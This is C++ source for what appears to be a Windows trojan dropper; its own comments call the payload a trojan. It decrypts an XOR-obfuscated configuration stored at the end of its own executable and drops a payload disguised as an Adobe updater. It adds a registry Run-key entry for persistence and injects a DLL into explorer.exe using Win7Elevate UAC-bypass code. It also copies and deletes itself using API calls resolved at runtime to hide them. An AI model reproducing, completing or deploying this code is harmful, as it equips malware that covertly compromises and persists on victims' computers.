// system.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <time.h>

#include "resource.h"
#include "macro.h"
#include "Win7Elevate_Inject.h"

#define SVRCTRL_EXE	1
#define SVRCTRL_DLL	2

static int GetCFG(union client_cfg& cfg)
{
	union client_cfg cfg2;
	char selfFile[MAX_PATH] = {0};
	do
	{
		//首先读取配置信息（位于PE文件的最后）
		if(GetModuleFileNameA(NULL, selfFile, MAX_PATH) == 0)
			break;

		FILE* fp = fopen(selfFile, "rb");
		if(fp == NULL)	break;
		if(fseek(fp , 0 - sizeof(cfg) , SEEK_END))
		{
			fclose(fp);
			return -1;
		}
		fread(&cfg, sizeof(cfg) , 1, fp);
		memcpy(&cfg2, &cfg, sizeof(cfg));
		fclose(fp);

		//是否为合法的配置信息
		if(memcmp(&cfg2, CFG_MAGIC, 8) != 0)
			return -1;

		//将配置信息解密
		unsigned char* pp = (unsigned char*)&cfg2;
		for (int i = sizeof(CFG_MAGIC); i < sizeof(cfg2.cfg1); i++)
			pp[i] ^= 0xFF;
	}while(0);

	return 1;
}

static int ReleaseFile(const char* filename, const union client_cfg& cfg, int rId)
{
	if(rId == SVRCTRL_EXE)
		return ReleaseExe(filename, cfg);

	else if(rId == SVRCTRL_DLL)
		return ReleaseDll(filename, cfg);

	else
		return -1;
}

int ReleaseOn64Bit(const union client_cfg& cfg)
{
	char appPath[MAX_PATH], appExe[MAX_PATH], appDir[MAX_PATH];
	SHGetSpecialFolderPathA(NULL, appPath, CSIDL_LOCAL_APPDATA, FALSE);

	//sprintf_s(appDir, sizeof(appDir), "%s\\Temp\\Word9.0", appPath);
	//sprintf_s(appExe, sizeof(appExe), "%s\\test.exe", appDir);
	_snprintf(appDir, sizeof(appDir), "%s\\Temp\\Adobe", appPath);
	_snprintf(appExe, sizeof(appExe), "%s\\AdobeUpdateManger.exe", appDir);

	//创建目录并释放文件
	CreateDirectoryA(appDir, NULL);
	if(ReleaseFile(appExe, cfg, SVRCTRL_EXE) < 0)
		return -1;

	//启动木马
	STARTUPINFOA startupInfo = {0};
	startupInfo.cb = sizeof(startupInfo);
	PROCESS_INFORMATION processInfo = {0};

	if(CreateProcessA(appExe, NULL, NULL, NULL, FALSE, 0, NULL, appPath, &startupInfo, &processInfo))
	{
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}

	//注册表加入自启动
	HMODULE hModule = GetModuleHandleA("advapi32.dll");
	if(hModule == NULL)	hModule = LoadLibraryA("advapi32.dll");
	typedef LONG (__stdcall* MyRegOpenKeyEx)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
	typedef LONG (__stdcall* MyRegSetValueEx)(HKEY, LPCSTR, DWORD, DWORD, CONST BYTE*, DWORD);	
	typedef LONG (__stdcall* MyRegCloseKey)(HKEY);
	
	MyRegOpenKeyEx openReg = NULL;
	MyRegSetValueEx setReg = NULL;
	MyRegCloseKey closeReg = NULL;
	if(hModule)
	{
		openReg = (MyRegOpenKeyEx)GetProcAddress(hModule, "RegOpenKeyExA");
		setReg = (MyRegSetValueEx)GetProcAddress(hModule, "RegSetValueExA");
		closeReg = (MyRegCloseKey)GetProcAddress(hModule, "RegCloseKey");
	}

	char buff[1024];
	HKEY hkRoot = HKEY_CURRENT_USER;
	strncpy(buff, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", sizeof buff);
	if( ERROR_SUCCESS == openReg(hkRoot, buff, 0, KEY_ALL_ACCESS, &hkRoot))
	{	
		setReg(hkRoot, "WordDaemon", 0, REG_SZ, (unsigned char*)appExe, strlen(appExe)+1);
		closeReg(hkRoot);
	}

	return 0;
}

int ReleaseOnVistaOrXP(const union client_cfg& cfg, bool isXP)
{
	char szTempPath[MAX_PATH], szTempFilePath[MAX_PATH];
	if(0 == GetTempPathA(MAX_PATH, szTempPath))
		return -1;
	if(0 == GetTempFileNameA(szTempPath, "dll", 0, szTempFilePath))
		return false;

	if(ReleaseFile(szTempFilePath, cfg, SVRCTRL_DLL) < 0)
		return -1;
	
	if(isXP)
	{
		char dllName[MAX_PATH] = {0};
		_snprintf(dllName, MAX_PATH, "%s\\%s", szTempPath, "msvcctrl.dll");
		DeleteFileA(dllName);
		MoveFileA(szTempFilePath, dllName);
		LoadLibraryA(dllName);
		return 0;
	}

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return -1;

	tagPROCESSENTRY32 pe;
	ZeroMemory(&pe, sizeof(pe));
	pe.dwSize = sizeof(pe);
	BOOL bPR = Process32First(hSnapshot, &pe);
	DWORD pid = 0;
	while(bPR)
	{
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
		if (hProc != 0)	CloseHandle(hProc);
		if(strcmp(pe.szExeFile, "explorer.exe") == 0)
		{
			pid = pe.th32ProcessID;
			break;
		}
		bPR = Process32Next(hSnapshot, &pe);
	}

	wchar_t filename[MAX_PATH] = {0};
	int len = MultiByteToWideChar(CP_ACP, 0, szTempFilePath, strlen(szTempFilePath), NULL, 0);
	if(len < 0 || len > MAX_PATH)	return -1;
	MultiByteToWideChar(CP_ACP, 0, szTempFilePath, strlen(szTempFilePath), filename, len);

	wchar_t szCmd[MAX_PATH] = {0}, szDir[MAX_PATH] = {0}, szPathToSelf[MAX_PATH] = {0};
	wchar_t strOurDllPath[MAX_PATH] = {0};

	GetSystemDirectoryW(szDir, sizeof(szDir));
	GetSystemDirectoryW(szCmd, sizeof(szCmd));
	wcscat(szCmd, L"\\cmd.exe");
	GetModuleFileNameW(NULL, szPathToSelf, MAX_PATH);

	AttemptOperation( true, true, pid, L"explorer,exe", szCmd, L"", szDir, filename);

	return 0;
}

int main(int argc, char* argv[])
{
	HMODULE hKernel;
	int funCopyF, funCreateF, funCreateP;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;

	hKernel = GetModuleHandleA("kernel32.dll");
	funCopyF = (int)GetProcAddress(hKernel, "CopyFileA");
	funCreateF = (int)GetProcAddress(hKernel, "CreateFileA");
	funCreateP = (int)GetProcAddress(hKernel, "CreateProcessA");

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	
	if ( argc == 2 )
	{
		while ( !DeleteFileA("2tem.exe") )
			;
		
		((void (__stdcall *)(DWORD, char *, DWORD, DWORD, signed int, signed int, DWORD, DWORD, int *, int *))funCreateP)(
		  0,
		  "net",
		  0,
		  0,
		  1,
		  2,
		  0,
		  0,
		  (int*)&si,
		  (int*)&pi);
		return 0;
	}
  
	SYSTEM_INFO sInfo;
	GetNativeSystemInfo(&sInfo);
	//GetSystemInfo(&sInfo);
	bool is32Bit = sInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL;
	
	OSVERSIONINFOA vInfo;
	ZeroMemory(&vInfo, sizeof(vInfo));
	vInfo.dwOSVersionInfoSize = sizeof(vInfo);
	if (!GetVersionExA(&vInfo) || vInfo.dwMajorVersion == 4 )
		return -1;

	union client_cfg gCFG;
	GetCFG(gCFG);

	//首先64位要特别处理
	if(is32Bit == false)	ReleaseOn64Bit(gCFG);
	//Windows Vista和7的处理
	else if(vInfo.dwMajorVersion == 6)	ReleaseOnVistaOrXP(gCFG, false);
	else if(vInfo.dwMajorVersion == 5)	ReleaseOnVistaOrXP(gCFG, true);

	if(argc == 1)
	{
		((void (__stdcall *)(const char *, DWORD, DWORD))funCopyF)(argv[0], (DWORD)"tem.exe", 0);
		
		MoveFileA(argv[0], "2tem.exe");
		
		sa.nLength = sizeof(sa);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		((void (__stdcall *)(DWORD, DWORD, signed int, int *, signed int, signed int, DWORD))funCreateF)(
			(DWORD)"tem.exe",
			  0,
			  1,
			  (int*)&sa,
			  3,
			  67108864,
			  NULL);
    
		((void (__stdcall *)(DWORD, DWORD, DWORD, DWORD, signed int, DWORD, DWORD, DWORD, int *, int *))funCreateP)(
			0,
			(DWORD)"tem.exe p",
			0,
			0,
			1,
			0,
			0,
			0,
			(int*)&si,
		    (int*)&pi);
	}
	
	return 0;
}

